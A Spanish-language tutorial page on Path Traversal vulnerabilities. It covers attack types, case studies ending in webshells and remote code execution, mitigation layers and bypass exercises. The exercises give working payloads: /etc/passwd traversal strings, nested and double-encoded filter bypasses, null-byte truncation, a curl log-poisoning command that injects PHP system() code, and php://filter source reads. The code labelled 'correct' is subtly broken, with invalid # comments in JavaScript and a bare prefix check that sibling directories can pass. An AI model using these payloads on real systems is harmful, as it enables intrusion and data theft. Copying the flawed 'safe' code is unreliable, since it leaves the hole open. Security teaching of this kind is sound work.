        01Que es el Path Traversal

        Una vulnerabilidad que lleva decadas en las listas de CWE y sigue matando. El atacante manipula una ruta de archivo para salir del directorio que el servidor espera y acceder a cualquier archivo del sistema.

        La idea en una frase

        Path Traversal (o Directory Traversal) es una vulnerabilidad que permite al atacante acceder a archivos y directorios que se encuentran fuera del directorio raiz de la aplicacion, manipulando variables que hacen referencia a rutas de archivo.

        El nombre tecnico es CWE-22 (Improper Limitation of a Pathname to a Restricted Directory). En la practica, significa que el servidor confia en lo que el cliente le dice sobre que archivo abrir, y no verifica que la ruta este dentro de donde deberia.

        Por que sigue existiendo

        • Complexidad de paths: las rutas de archivo son diferentes entre SO, lo que dificulta las pruebas.
        • Malentendidos de sanitizacion: muchos desarrolladores creen que reemplazar ../ es suficiente, pero las variaciones son enormes.
        • Bibliotecas de terceros: a menudo la vulnerable no es la aplicacion sino una libreria que procesa archivos.
        • Falta de validacion centralizada: cada endpoint que maneja archivos implementa su propia logica.

        Diferencia con SSRF

        No confundir con Server-Side Request Forgery (SSRF). En SSRF el servidor hace peticiones HTTP a recursos internos; en Path Traversal, el servidor lee archivos del propio sistema de archivos local.

        Impacto

        • Lectura de archivos del sistema: /etc/passwd, /etc/shadow, configuraciones de base de datos.
        • Lectura de codigo fuente: evaluar la logica de la aplicacion para encontrar mas vulnerabilidades.
        • Lectura de llaves y tokens: archivos .env, certificados SSL, tokens JWT.
        • Escritura arbitraria (en algunos casos): crear o sobrescribir archivos en ubicaciones controladas.
        • Ejecucion remota de codigo: cuando se combina con includes (LFI) o log poisoning.

        Aviso

        Path Traversal puede ser tanto de lectura como de escritura. La escritura es menos comun pero mucho mas peligrosa: permite crear archivos PHP en el directorio web para ejecutar codigo remoto.

        02Tipos de Path Traversal

        No todos los traversals son iguales. La diferencia entre una lectura simple y una ejecucion remota de codigo esta en como se usa la ruta manipulada.

        Nota

        En Windows, ../ y ..\ son equivalentes. Muchos filtros solo bloquean ../ y se saltan con ..\/ o ..%5c. En Linux, el separador es solo /.

        06Escenarios reales y casos de estudio

        Los Path Traversal mas peligrosos no son los que leen /etc/passwd, sino los que se combinan con otras debilidades para alcanzar impacto maximo.

        Caso 1

        LFI + Log poisoning = RCE total

        Aplicacion PHP con un parametro include vulnerable. El servidor no filtra ../ y el log de Apache es accesible. Un atacante inyecta codigo PHP en el User-Agent, luego incluye el log con path traversal y obtiene ejecucion remota.

        Critico

        CWE-98 - PHP Remote File Inclusion

        LFI + Log poisoning en CMS corporativo

        Probabilidad
        Impacto

        Cadena de explotacion

        • Fase 1: Detectar el parametro vulnerable con ../../etc/passwd
        • Fase 2: Confirmar PHP con phpinfo.php o wrappers
        • Fase 3: Inyectar codigo en el log de Apache via User-Agent
        • Fase 4: Incluir el log con path traversal para ejecutar codigo
        • Fase 5: Obtener shell reversa y escalar privilegios

        Caso 2

        Path Traversal + Archivos .env = Credenciales de produccion

        Una aplicacion Node.js expone un endpoint de descarga de archivos. Sin autenticacion, un atacante puede leer el archivo .env del directorio raiz de la aplicacion, obteniendo credenciales de base de datos, API keys y tokens de servicios.

        Alto

        CWE-22 + CWE-200

        Filtracion de credenciales via Path Traversal

        Probabilidad
        Impacto

        Hallazgos

        • /download?file=.env - DB_PASSWORD, AWS_SECRET_KEY, JWT_SECRET
        • /download?file=.git/HEAD - Repositorio expuesto
        • /download?file=config/production.json - Configuracion completa
        • Impacto: acceso a base de datos de clientes, robo de datos personales

        Caso 3

        Escritura arbitraria to Webshell

        Un endpoint de upload de archivos en Java permite escribir en rutas arbitrarias. El atacante escribe un JSP en el directorio web y obtiene ejecucion remota.

        Critico

        CWE-22 + CWE-434

        Escritura de webshell via Path Traversal

        Probabilidad
        Impacto

        Cadena de explotacion

        • Upload con ruta controlada: file=../../webapps/ROOT/shell.jsp
        • Contenido del archivo: webshell que ejecuta comandos
        • Ejecucion: /shell.jsp?cmd=id
        • Resultado: shell remota con privilegios del servidor

        Patron

        Los Path Traversal rara vez son el impacto final. Son una puerta de entrada que se combina con: filtracion de credenciales, inclusion de codigo, escritura de archivos, o acceso a logs para obtener ejecucion remota.

        07Prevencion y mitigacion

        La defensa contra Path Traversal tiene capas. Ninguna es infalible por si sola; la combinacion de todas ellas es lo que reduce el riesgo a niveles aceptables.

        Regla de oro

        Nunca confies en la entrada del cliente

        El principio fundamental: el cliente puede enviar cualquier cosa. Si tu aplicacion acepta un nombre de archivo del cliente, debes tratarlo como entrada hostil siempre.

        Nivel 1

        Validacion de entrada

        TecnicaDescripcionEficacia
        Whitelist de caracteresPermitir solo [a-zA-Z0-9._-] en nombres de archivoAlta
        Bloqueo de ..Rechazar cualquier entrada que contenga ..Media (bypassable)
        Bloqueo de / y \No permitir separadores de rutaMedia
        Validacion de longitudLimitar la longitud del parametroBaja
        Validacion de tipoSi el parametro debe ser numerico, verificar que lo esAlta (cuando aplica)

        Nivel 2

        Resolucion de ruta segura

        Resolucion de ruta segura Correcto 
        # Node.js - Resolucion y verificacion
const path = require('path');

function safePath(userInput, allowedDir) {
  # Resolver la ruta completa
  const resolved = path.resolve(allowedDir, userInput);
  # Verificar que esta dentro del directorio permitido
  if (!resolved.startsWith(allowedDir)) {
    throw new Error('Acceso denegado');
  }
  return resolved;
}

# Uso
const filePath = safePath(req.query.file, '/docs');
res.sendFile(filePath);
        Comparacion con codigo inseguro Incorrecto 
        # Node.js - Codigo vulnerable
app.get('/download', (req, res) => {
  const file = req.query.file;
  # Sin validacion: Path Traversal directo
  res.sendFile(path.join('/docs', file));
});

# Java - Codigo vulnerable
String file = request.getParameter("file");
FileInputStream fis = new FileInputStream("/docs/" + file);

        Nivel 3

        Chroot y aislamiento del sistema de archivos

        • Chroot jail: ejecutar la aplicacion en un directorio aislado donde / es en realidad /chroot/docs/.
        • Docker: contenedor con sistema de archivos minimo, sin acceso a /etc del host.
        • SELinux/AppArmor: restringir que archivos puede leer el proceso.
        • Permisos de archivos: ejecutar con el usuario menos privilegiado posible.

        Nivel 4

        Defensa en profundidad

        CapaMedida
        EntradaWhitelist de caracteres, tipo de dato, longitud maxima
        Resolucionpath.resolve() + verificacion de prefijo
        Sistema de archivosChroot, Docker, permisos minimos
        MonitoreoAlertas en intentos de acceso a /etc, /proc, etc.
        WAFReglas que detectan patrones de traversal
        LogsRegistrar todos los intentos de Path Traversal

        Errores comunes

        Reemplazo de ../: trivialmente superable. Bloqueo de palabras clave: bypassable con encoding. Validacion solo en cliente: el atacante nunca pasa por el formulario. Confiar en realpath(): puede fallar en race conditions.

        Ejercicio 01

        Basico

        Un endpoint acepta ?file=documento.pdf. Obtener el contenido de /etc/passwd.

        1. Prueba variaciones de ../ en el parametro.

        Ejercicio 02

        Basico

        El servidor reemplaza ../ por vacio una sola vez. Obtener /etc/passwd.

        1. Que pasa si anidas ../ dentro de ../?
        # El filtro elimina ../ una vez:
....//....//....//etc/passwd
# Despues del filtro queda:
../../etc/passwd

        Ejercicio 03

        Intermedio

        El servidor decodifica la URL una vez y filtra ../. Obtener /etc/passwd.

        1. Que pasa si codificas el % de %2f?
        # Codificacion doble:
..%252f..%252f..%252fetc%252fpasswd
# Primera decodificacion: ..%2f..%2f..%2fetc%2fpasswd
# Segunda decodificacion: ../../etc/passwd

        Nivel intermedio

        Ejercicios de bypass

        Ejercicio 04

        Intermedio

        El servidor agrega .jpg al final del nombre de archivo. Obtener /etc/passwd.

        1. El byte nulo %00 trunca la cadena en C.
        GET /download?file=../../etc/passwd%00.jpg HTTP/1.1
# La ruta real se convierte en: ../../etc/passwd\0.jpg
# El \0 termina la cadena, ignora .jpg
# NOTA: Solo funciona en versiones antiguas de PHP (<5.3.4)

        Ejercicio 05

        Intermedio

        Tienes un Path Traversal en PHP pero no puedes ejecutar comandos directamente. Obtener ejecucion remota.

        1. PHP escribe el User-Agent en el access.log.
        # Paso 1: Inyectar PHP en el log
$ curl -A '<?php system($_GET["cmd"]); ?>' http://target/
# Paso 2: Incluir el log con path traversal
GET /download?file=../../var/log/apache2/access.log&cmd=id
# El servidor ejecuta el PHP del User-Agent

        Ejercicio 06

        Intermedio

        No puedes salir del directorio de uploads, pero necesitas ver el codigo fuente de index.php.

        1. PHP tiene wrappers que pueden leer archivos.
        # Usar php://filter para leer el codigo fuente
GET /download?file=php://filter/convert.base64-encode/resource=index.php
# Decodificar el base64 para obtener el PHP
$ echo "PD9waHAuLi4=" | base64 -d

        10Glosario de terminos

        Definiciones claras para que no haya confusion con los terminos.

        Glosario

        Path Traversal
        Vulnerabilidad que permite acceder a archivos fuera del directorio previsto manipulando rutas de archivo.
        Directory Traversal
        Sinonimo de Path Traversal. Mismo concepto, distinto nombre.
        LFI (Local File Inclusion)
        Tipo de Path Traversal donde se incluye un archivo local en la ejecucion de la aplicacion.
        RFI (Remote File Inclusion)
        Inclusion de un archivo remoto controlado por el atacante (requiere configuracion especifica).
        Null Byte
        El caracter %00 que trunca cadenas en lenguajes basados en C (PHP < 5.3.4).
        Log Poisoning
        Tecnica de inyectar codigo malicioso en los logs del servidor para luego ejecutarlo via LFI.
        Wrapper
        Protocolo de PHP que permite acceder a distintos recursos (archivos, URLs, datos).
        Sanitizacion
        Proceso de limpiar la entrada del usuario eliminando o codificando caracteres peligrosos.
        Whitelist
        Lista de caracteres o valores permitidos. Mas seguro que un blacklist.
        Blacklist
        Lista de caracteres o valores bloqueados. Menos seguro que un whitelist.
        Chroot
        Mecanismo del SO que limita el directorio raiz de un proceso.
        Symlink
        Enlace simbolico que apunta a otra ubicacion del sistema de archivos.
        Webshell
        Script malicioso (PHP, JSP, ASP) que permite ejecutar comandos remotamente.
